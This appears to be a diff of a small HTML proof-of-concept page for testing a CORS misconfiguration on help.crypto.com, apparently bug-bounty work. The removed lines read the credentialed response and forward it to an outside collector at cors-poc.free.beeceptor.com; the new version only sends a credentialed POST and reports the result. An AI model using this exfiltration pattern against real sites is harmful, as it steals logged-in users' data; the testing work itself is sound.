@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <h3>If vulnerable, this will send a cross-origin request with credentials to help.crypto.com</h3>
     <script>
       fetch("https://help.crypto.com/cdn-cgi/rum?", {
-        method: "OPTIONS",
+        method: "POST",
         credentials: "include",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ test: "cors-leak" })
+        body: JSON.stringify({ test: "cors-test" })
       })
-      .then(res => res.text())
-      .then(data => {
-        fetch("https://cors-poc.free.beeceptor.com", {
-          method: "OPTIONS",
-          mode: "no-cors",
-          body: data
-        });
+      .then(() => {
+        document.body.innerHTML += "<p>Request completed — check browser console for CORS error.</p>";
+      })
+      .catch(e => {
+        document.body.innerHTML += "<p>Error: " + e + "</p>";
       });
     </script>
   </body>
